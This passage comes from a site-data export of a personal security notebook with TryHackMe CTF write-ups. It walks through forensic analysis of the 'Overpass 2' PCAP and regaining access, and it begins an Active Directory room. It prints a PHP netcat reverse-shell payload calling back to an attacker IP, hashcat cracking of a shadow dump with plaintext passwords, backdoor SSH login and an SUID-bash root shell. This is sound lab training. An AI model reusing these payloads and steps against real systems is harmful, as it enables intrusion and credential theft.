data-slug=&quot;spells/meterpreter&quot;&gt;meterpreter&lt;/a&gt; flags this as being deprecated now; the modern pattern seems to be to background &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/meterpreter&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/meterpreter&quot;&gt;meterpreter&lt;/a&gt; and then switch to and exploit the &lt;code&gt;exploit/windows/local/persistence&lt;/code&gt; module, probably with &lt;code&gt;set STARTUP SYSTEM&lt;/code&gt;.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;&lt;strong&gt;Elapsed Time:&lt;/strong&gt; 2 h 15 min&lt;/p&gt;","rssInclude":true},"journals/2021-12-14":{"slug":"journals/2021-12-14","filePath":"journals/2021-12-14.md","title":"Overpass 2: Hacked","links":["spells/HTTP","spells/netcat","spells/TCP","spells/TCP-header-flags","spells/SSH","spells/Hashcat","spells/Avoid-dropping-privileges-with-SUID-Bash"],"tags":["Journal/Tale"],"content":"\n\n                  \n                  Note\n                  \n                \n\n\n“Overpass 2: Hacked” on TryHackMe\n\n\n\nThe flags are structured to basically walk us through this room.\nForensics: Analyze the PCAP\nI’ve not actually used Wireshark outside of the TryHackMe: Wireshark 101 “room” (and a few short digressions in other rooms), so I’m honestly a little worried about my abilities here…\nFiltering the PCAP file for HTTP requests reveals a single POST from 192.168.179.145 to http://192.168.170.159/development/upload.php. A subsequent request from 192.168.179.145 pulls the directory listing of /development/uploads/, and then GETs /development/uploads/payload.php. This suggests that 192.168.179.145 is the “attacker” and 192.168.179.145 is the target system.\nWe can save off this POST request to get at the uploaded payload.php file, which turns out to have the contents:\n&lt;?php exec(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.170.145 4242 &gt;/tmp/f&quot;)?&gt;\nThis is popping a simple reverse shell through netcat that connects back to 192.168.170.145:4242, which would seem to confirm that this was the machine used by the attacker.\nThis means that penetration occurs when this file is requested in packet 27.\nLooking at subsequent TCP packets, we can see what the attacker typed in the packets going from 192.168.170.145 → 192.168.170.159, and the responses in the packets going from 192.168.170.159 → 192.168.170.145. Requests/Responses coming through netcat use the TCP PSH flag, so we can filter by tcp.port == 4242 and tcp.flags.push to zoom in on this conversation.\nThe attacker eventually issues su james to elevate privileges  (packet 71), and a few packets down we can see james’s password.\nIn packet 112 the attacker cats /etc/shadow, and we get a full dump in packet 114. They then issue git clone github.com/NinjaJc01/ssh-backdoor, generate an SSH private key, and switch to the included backdoor binary, at which point we lose the thread.\nReturning to packet 114, we can use Copy → Copy Bytes as Printable Text to pull the contents of /etc/shadow (+ a little garbage).  After a little cleanup, we have 5 users with passwords (including james, which we know already).\nWe extract the hashes and then throw Hashcat at this using the suggested “fasttrack” wordlist.\nhashcat -m 1800 \\\n        -O hashes.txt /usr/share/wordlists/fasttrack.txt\nFour out of the five passwords turn out to be crackable:\nparadox:secuirty3\nszymex:abcd123\nbee:secret12\nmuirland:1qaz2wsx\n\nThis ironically doesn’t include james!\nResearch: Analyze the code\nIt turns out that github.com/NinjaJc01/ssh-backdoor is a real thing, with the code itself living in github.com/NinjaJc01/ssh-backdoor/blob/master/main.go.\nThe hashPassword() function here takes the SHA-512 hash of the provided password + the salt. The default has is overridden using the -a flag. We can see that the attacker used this flag when the backdoor was called in packet 3479.\n./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed\nWe can use Hashcat to again crack this.\nhashcat \\\n\t-m 1710 \\\n\t-O 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05 \\\n\t   ~/.local/share/red-team/wordlists/rockyou.txt\nAttack: Get back in!\nThe last bit of this CTF uses a server, which for this run is at 10.10.114.161. Just visiting that page gives us our first flag.\nWe’ll get back in using the backdoor that the attacker set up. From the backdoor code we know that the SSH server is running on port 2222, and there don’t seem to be any user checks. So…\nenv -u SSH_AUTH_SOCK -u SSH_AGENT_PID \\\n\tssh -p 2222 user@10.10.114.161\n…lets us in as expected (with the password we previously cracked).\nThe user flag is in /home/james/user.txt.\nUnfortunately, none of the passwords we cracked earlier work anymore. After checking a couple of possible exploits to get around this, I decided just to see what SUID binaries were on the system (figuring that I’d check them against GTFOBins).\nfind / -type f -perm -u+s -exec ls -l &quot;{}&quot; \\;\nThis turned up an unusual file — /home/james/.suid_bash. Could this be… an SUID copy of Bash? Indeed it is!\n/home/james/.suid_bash -p # Root shell!\nThe root flag is then in /root/root.txt.\nElapsed Time: 1 h 43 min","richContent":"&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/overpass2hacked&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;“Overpass 2: Hacked” on TryHackMe&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;The flags are structured to basically walk us through this room.&lt;/p&gt;\n&lt;h2 id=&quot;forensics-analyze-the-pcap&quot;&gt;Forensics: Analyze the PCAP&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#forensics-analyze-the-pcap&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;I’ve not actually used Wireshark outside of the &lt;a href=&quot;https://tryhackme.com/room/wireshark&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;TryHackMe: Wireshark 101&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; “room” (and a few short digressions in other rooms), so I’m honestly a little worried about my abilities here…&lt;/p&gt;\n&lt;p&gt;Filtering the PCAP file for &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/HTTP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/HTTP&quot;&gt;HTTP&lt;/a&gt; requests reveals a single POST from 192.168.179.145 to &lt;code&gt;http://192.168.170.159/development/upload.php&lt;/code&gt;. A subsequent request from 192.168.179.145 pulls the directory listing of /development/uploads/, and then GETs /development/uploads/payload.php. This suggests that 192.168.179.145 is the “attacker” and 192.168.179.145 is the target system.&lt;/p&gt;\n&lt;p&gt;We can save off this POST request to get at the uploaded payload.php file, which turns out to have the contents:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;php&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;php&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;&amp;#x3C;?&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;php&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; exec&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;#x26;1|nc 192.168.170.145 4242 &gt;/tmp/f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This is popping a simple reverse shell through &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/netcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netcat&quot;&gt;netcat&lt;/a&gt; that connects back to 192.168.170.145:4242, which would seem to confirm that this was the machine used by the attacker.&lt;/p&gt;\n&lt;p&gt;This means that penetration occurs when this file is requested in packet 27.&lt;/p&gt;\n&lt;p&gt;Looking at subsequent &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; packets, we can see what the attacker typed in the packets going from 192.168.170.145 → 192.168.170.159, and the responses in the packets going from 192.168.170.159 → 192.168.170.145. Requests/Responses coming through &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/netcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netcat&quot;&gt;netcat&lt;/a&gt; use the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/TCP-header-flags&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP-header-flags&quot;&gt;TCP PSH flag&lt;/a&gt;, so we can filter by &lt;code&gt;tcp.port == 4242 and tcp.flags.push&lt;/code&gt; to zoom in on this conversation.&lt;/p&gt;\n&lt;p&gt;The attacker eventually issues &lt;code&gt;su james&lt;/code&gt; to elevate privileges  (packet 71), and a few packets down we can see james’s password.&lt;/p&gt;\n&lt;p&gt;In packet 112 the attacker cats /etc/shadow, and we get a full dump in packet 114. They then issue &lt;code&gt;git clone https://github.com/NinjaJc01/ssh-backdoor&lt;/code&gt;, generate an &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt; private key, and switch to the included backdoor binary, at which point we lose the thread.&lt;/p&gt;\n&lt;p&gt;Returning to packet 114, we can use &lt;strong&gt;Copy → Copy Bytes as Printable Text&lt;/strong&gt; to pull the contents of /etc/shadow (+ a little garbage).  After a little cleanup, we have 5 users with passwords (including james, which we know already).&lt;/p&gt;\n&lt;p&gt;We extract the hashes and then throw &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Hashcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Hashcat&quot;&gt;Hashcat&lt;/a&gt; at this using the suggested “fasttrack” wordlist.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;hashcat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -m&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 1800&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;        -O&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; hashes.txt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/share/wordlists/fasttrack.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Four out of the five passwords turn out to be crackable:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;paradox:secuirty3\nszymex:abcd123\nbee:secret12\nmuirland:1qaz2wsx\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;This ironically &lt;em&gt;doesn’t&lt;/em&gt; include james!&lt;/p&gt;\n&lt;h2 id=&quot;research-analyze-the-code&quot;&gt;Research: Analyze the code&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#research-analyze-the-code&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;It turns out that &lt;a href=&quot;https://github.com/NinjaJc01/ssh-backdoor&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;https://github.com/NinjaJc01/ssh-backdoor&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; is a real thing, with the code itself living in &lt;a href=&quot;https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;p&gt;The &lt;code&gt;hashPassword()&lt;/code&gt; function here takes the SHA-512 hash of the provided password + the salt. The default has is overridden using the &lt;code&gt;-a&lt;/code&gt; flag. We can see that the attacker used this flag when the backdoor was called in packet 3479.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;./backdoor&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -a&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;We can use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Hashcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Hashcat&quot;&gt;Hashcat&lt;/a&gt; to again crack this.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;hashcat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-m&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 1710&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-O&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\t   ~/.local/share/red-team/wordlists/rockyou.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;attack-get-back-in&quot;&gt;Attack: Get back in!&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#attack-get-back-in&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;The last bit of this CTF uses a server, which for this run is at 10.10.114.161. Just visiting that page gives us our first flag.&lt;/p&gt;\n&lt;p&gt;We’ll get back in using the backdoor that the attacker set up. From the backdoor code we know that the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt; server is running on port 2222, and there don’t seem to be any user checks. So…&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;env&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; SSH_AUTH_SOCK&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; SSH_AGENT_PID&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\tssh&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 2222&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; user@10.10.114.161&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;…lets us in as expected (with the password we previously cracked).&lt;/p&gt;\n&lt;p&gt;The user flag is in /home/james/user.txt.&lt;/p&gt;\n&lt;p&gt;Unfortunately, none of the passwords we cracked earlier work anymore. After checking a couple of possible exploits to get around this, I decided just to see what SUID binaries were on the system (figuring that I’d check them against &lt;a href=&quot;https://gtfobins.github.io/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;GTFOBins&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;).&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;find&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -type&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -perm&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -u+s&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -exec&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; ls&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -l&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;{}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This turned up an unusual file — &lt;code&gt;/home/james/.suid_bash&lt;/code&gt;. Could this be… &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Avoid-dropping-privileges-with-SUID-Bash&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Avoid-dropping-privileges-with-SUID-Bash&quot;&gt;an SUID copy of Bash&lt;/a&gt;? Indeed it is!&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;/home/james/.suid_bash&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; # Root shell!&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;The root flag is then in /root/root.txt.&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;Elapsed Time:&lt;/strong&gt; 1 h 43 min&lt;/p&gt;","rssInclude":true},"journals/2021-12-30":{"slug":"journals/2021-12-30","filePath":"journals/2021-12-30.md","title":"Attacktive Directory","links":["spells/Nmap","spells/enum4linux","spells/Kerbrute","spells/Impacket","spells/AS-REP-roasting","spells/Hashcat","spells/Kerberos","spells/XFreeRDP","spells/smbclient","spells/Evil-WinRM"],"tags":["Journal/Tale"],"content":"\n\n                  \n                  Note\n                  \n                \n\n\n“Attacktive Directory” on TryHackMe\n\n\n\nWelcome to Attacktive Directory\nAs usual, we start off with an Nmap scan. Our target IP address is 10.10.177.198.\nsudo nmap -v -oA attacktive-directory -Pn -A -T4 -sS \\\n          -script vuln -p- 10.10.177.198\nThis gives us the following results.\n# Nmap 7.92 scan initiated Thu Dec 30 20:16:35 2021 as: nmap -v -oA attacktive-directory -Pn -A -T4 -sS -script vuln -p- 10.10.177.198\nPre-scan script results:\n|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)\nIncreasing send delay for 10.10.177.198 from 0 to 5 due to 2065 out of 5162 dropped probes since last increase.\nIncreasing send delay for 10.10.177.198 from 5 to 10 due to 11 out of 14 dropped probes since last increase.\nNmap scan report for 10.10.177.198\nHost is up (0.18s latency).\nNot shown: 65507 closed tcp ports (reset)\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.\n|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.\n|_http-server-header: Microsoft-IIS/10.0\n|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-31 03:31:28Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n|_ssl-ccs-injection: No reply from server (TIMEOUT)\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n|_ssl-ccs-injection: No reply from server (TIMEOUT)\n3389/tcp  open  ms-wbt-server Microsoft Terminal Services\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-dombased-xss: 